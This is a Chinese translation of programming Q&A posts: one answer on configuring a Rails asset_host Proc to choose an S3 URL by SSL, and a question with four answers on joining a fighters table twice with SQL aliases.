## 回答 #1

> 赞同：17
> 
> 时间：2012-04-20T19:18:24.763

为我的情况找出解决方案。

最终在我的生产环境文件中使用 config.action_controller.action_host 上的 Proc 来处理 request.ssl 上的逻辑？并做出相应的回应。这是代码

```
config.action_controller.asset_host = Proc.new { |source, request = nil, *_|
  request && request.ssl? ? 'https://s3.amazonaws.com/my_bucket' : 'http://s3.my-domain.com'
} 
```

'request' 设置为 nil 以适应在资产文件中调用asset_host 的情况（如果您使用资产助手标签，则为CSS 和JS）。由于 request 不存在，并且如果在 args 中没有指定 request，那么编译 assets 时会抛出错误（如下所示）。

```
This asset host cannot be computed without a request in scope. Remove the second argument to your asset_host Proc if you do not need the request, or make it optional. 
```

[*_ 是由于 Proc http://bugs.ruby-lang.org/issues/5694](http://bugs.ruby-lang.org/issues/5694)中带有选项参数的错误而存在的

# sql - SQL在具有不同值的两列中相同连接

> ID：10218999
> 
> 赞同：2
> 
> 时间：2012-04-18T22:26:32.453
> 
> 标签：sql, join

我不知道这样做的最佳方法是什么

**斗争**

```
Fighter_ID1 | Fighter_ID2 
```

**战士**

```
ID | Fighter 
```

**输出**

```
Fighter1 | Fighter2 
```

我想将表的列`fighter`与表`FIGHTERS`中的两列`FIGHT`..

这可能是一个愚蠢的问题，但我不知道如何以正确的方式做到这一点

对不起我的英语，谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-18T22:30:56.123

```
SELECT  F1.Fighter as Fighter1,
        F2.Fighter as Fighter2
FROM    FIGHT
        INNER JOIN FIGHTERS as F1 ON FIGHT.Fighter_ID1 = F1.ID
        INNER JOIN FIGTHERS as F2 ON FIGHT.Fighter_ID2 = F2.ID 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-18T22:31:10.007

看起来你需要在桌子上加入两次。

```
SELECT fs1.Fighter as Fighter1, fs2.Fighter as Figther2
FROM Fight f
INNER JOIN Fighters fs1
    ON f.Fighter_ID1 = fs1.id
INNER JOIN Fighters fs2
    ON f.Fighter_ID2 = fs2.id 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-18T22:31:39.470

怎么样

```
 select f1.name, f2.name -- pick any column you like
    from FIGHT f -- from here we join both fighters by id
    join FIGHTER f1 on f.fighter_id1 = f1.id
    join FIGHTER f2 on f.fighter_id2 = f2.id 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-04-18T22:32:01.847

因为每场战斗你都会有 2 名战士，所以你需要给你的桌子起别名。我在这里直接输入，所以我不能保证它是 100% 准确的，但它应该看起来像这样：

```
SELECT * 
FROM FIGHT 
  INNER JOIN FIGHTERS AS F1 ON F1.ID = Fighter_ID1
  INNER JOIN FIGHTERS AS F2 ON F2.ID = Fighter_ID2 
```

然后您可以使用 F1.Fighter 和 F2.Fighter 作为您的字段来获取战斗机名称。